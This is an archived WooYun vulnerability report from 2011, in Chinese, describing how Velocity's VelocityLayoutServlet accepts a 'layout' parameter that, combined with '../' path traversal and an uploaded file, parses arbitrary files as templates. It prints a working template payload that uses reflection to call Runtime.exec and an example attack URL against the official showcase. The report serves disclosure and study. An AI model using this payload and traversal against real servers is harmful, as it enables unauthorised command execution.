@@ -1,0 +1,278 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		VELOCITY本地代码执行漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		VELOCITY本地代码执行漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/路人甲">路人甲</a> 
+</li><li>提交时间：		2011-08-28 21:58</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-08-28：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2011-08-29：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">velocity是J2EE的MVC架构最常用的展示层模板文件，由于性能优秀，极多的J2EE应用，都使用了这个模板。通常在使用的时候，会和其他框架结合，最常见的框架是struts2、spring mvc等框架。<br />
+ 模板的扩展名为“vm”，开发人员在配置时，经常需要让框架解析“vm”扩展名。velocity官方，给出了标准配置，就在showcase中，指导大家配置vm文件的servlet为VelocityLayoutServlet。<br />
+ 如果按照velocity的官方标配，就会产生这个漏洞（velocity-tools-2.0大家可以下载它的showcase，直接跑起来）。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">漏洞原理：<br />
+<br />
+ 在使用velocity框架的时候，开发往往会配置URL中，请求文件扩展名为vm时，就解析对应的velocity模板，这时就需要一个servlet。velocity给出了自己的servlet，供大家使用，一共提供了两个，其中最为推荐的，就是VelocityLayoutServlet，因为官方showcase中就使用了这个。<br />
+<br />
+ 这个servlet配合几个技巧，可以做到执行任意java代码。<br />
+<br />
+ 漏洞入口：<br />
+<br />
+ 漏洞在于VelocityLayoutServlet允许用户提交layout参数，指定模板位置。<br />
+<br />
+ 在这个servlet寻找layout模板时，可以允许url参数提交过来。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+protected String findLayout(HttpServletRequest request)<br />
+<br />
+{<br />
+<br />
+// check if an alternate layout has been specified<br />
+<br />
+// by way of the request parameters<br />
+<br />
+String layout = request.getParameter(KEY_LAYOUT);<br />
+<br />
+// also look in the request attributes<br />
+<br />
+if (layout == null)<br />
+<br />
+{<br />
+<br />
+layout = (String)request.getAttribute(KEY_LAYOUT);<br />
+<br />
+}<br />
+<br />
+return layout;<br />
+<br />
+}<br />
+<br />
+从代码中可以看到，参数中指定了layout，servlet之后的代码，就去解析模板了。<br />
+<br />
+ 相关代码<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+mergeTemplate(template, context, response);<br />
+<br />
+利用技巧1：<br />
+<br />
+ 这段代码，不会去管模板的扩展名是否为vm，都去解析。因为velocity本身就具备配置文件扩展名功能，你可以在配置中指定velocity解析html文件为模板文件。<br />
+<br />
+ 所以，从框架的角度讲，官方只会说这是个必备的功能。<br />
+<br />
+ 利用技巧2：<br />
+<br />
+ 虽然可以在velocity配置文件中，指定模板位置必须在layout文件夹中，但是可以使用“../”绕过。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+tools.view.servlet.layout.directory = /layout/<br />
+<br />
+这是一个悲剧的点，如果限制死目录，漏洞就会影响很小。<br />
+<br />
+ 利用技巧3：<br />
+<br />
+ 算了，暂时不提了，下一个框架漏洞会说到这里的一个大家很熟悉，但是也很猥琐的东西。<br />
+<br />
+ 利用技巧4：<br />
+<br />
+ velocity模板解析时，是允许访问很多东西的，你可以认为他其实就是jsp的升级版，其中就包括执行系统命令。<br />
+<br />
+ 是的，这个事情，我在google没看到有人提到过，是我去年偶然发现的（也许牛人从不说出来）。<br />
+<br />
+ 我写一个简单的demo，利用velocity可以执行java代码的特性，执行系统命令。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+#set ($exec = &quot;kxlzx&quot;)<br />
+<br />
+$exec.class.forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)<br />
+<br />
+原理是，定义一个变量叫$exec，变量其实是继承了Object，所以可以调用Object的方法。其中一个属性叫class，可以反射类，我喜欢这个功能，他被无数次应用在java框架漏洞中。这样一步一步来到执行系统命令的地方，执行掉。<br />
+<br />
+ 利用限制1（必须上传文件）：<br />
+<br />
+ 很明显，这不是大家愿意看到的，它所能执行的本地文件，必须在web目录下，因为velocity从很早的版本起，就可以配置把目录限制的死死的，vm模板只能在web目录下。<br />
+<br />
+ 所以必须上传文件上来，无论什么扩展名。<br />
+<br />
+ 利用限制2（如何从外部发现）：<br />
+<br />
+ 这一点比较难，因为如果找不到layout，也就是攻击者随便指定不存在的layout，就会把错误日志记录下来，但是并不返回给用户。<br />
+<br />
+ 用户看到的，是一个200正常页面。在错误的layout的情况下，就会用默认的layout，这是从外部看到的结果，是和没有输入这个参数，一样的页面。唯一能确定的，就是url中有很大的肯定扩展名为vm（前文提到可以配置其他扩展名）。<br />
+<br />
+ 其他的不想在这里多说，回头会发布一篇web框架指纹的文章，专门讨论这个问题。<br />
+<br />
+ <br />
+<br />
+攻击示例：<br />
+<br />
+ 比如velocity的官方showcase<br />
+<br />
+ 如果攻击者可以传文件到web目录下，比如<br />
+<br />
+ z.gif：<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+#set ($exec = &quot;kxlzx&quot;)$exec.class.forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)<br />
+<br />
+hacked by kxlzx&amp;lt;br&amp;gt;<br />
+<br />
+&lt;a href=&quot;http://www.inbreak.net/&quot;&gt;http://www.inbreak.net/&lt;/a&gt;<br />
+<br />
+然后访问：http://localhost:8080/showcase/context.vm?layout=../z.gif<br />
+<br />
+ <br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/282157350d6ce5e4a3bed520ddf5bfb2959ad887.jpg" target="_blank"><img src="../images/282157350d6ce5e4a3bed520ddf5bfb2959ad887.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">。。。。。。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/路人甲" title="路人甲">路人甲</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-02746" title="VELOCITY本地代码执行漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：15 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="2746";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
